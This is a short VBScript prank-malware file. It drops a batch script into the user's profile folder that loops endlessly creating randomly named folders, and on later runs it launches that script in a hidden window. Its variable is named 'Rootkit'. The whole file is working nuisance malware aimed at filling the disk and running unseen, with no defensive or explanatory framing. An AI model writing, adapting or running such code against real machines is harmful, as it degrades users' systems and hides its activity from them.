
dim objShell
dim filesystem
dim Rootkit

Set objShell = CreateObject ("WScript.Shell")
Set filesystem = CreateObject ("Scripting.FileSystemObject")

userprofile = objShell.ExpandEnvironmentStrings ("%USERPROFILE%")

If NOT (filesystem.FileExists (userprofile + "\Infinite_folders.bat")) Then

	Set Rootkit = filesystem.CreateTextFile (userprofile + "\Infinite_folders.bat", True)
	
	Rootkit.WriteLine ("@echo off")
	Rootkit.WriteLine ("title Infinite folders.bat")
	Rootkit.WriteLine ("color 0c")
	Rootkit.WriteLine ("mode con cols=20 lines=1")
	Rootkit.WriteLine ("cls")
	Rootkit.WriteLine ("goto :Infinite_folders")
	Rootkit.WriteLine (":Infinite_folders")
	Rootkit.WriteLine ("mkdir %random% > nul")
	Rootkit.WriteLine ("goto :Infinite_folders")
	Rootkit.WriteLine ("cls")
	Rootkit.WriteLine ("goto :exit")
	Rootkit.WriteLine (":exit")
	Rootkit.WriteLine ("exit")
	
	Rootkit.Close

Else

	objShell.run "%userprofile%\Infinite_folders.bat", 0
	
End If
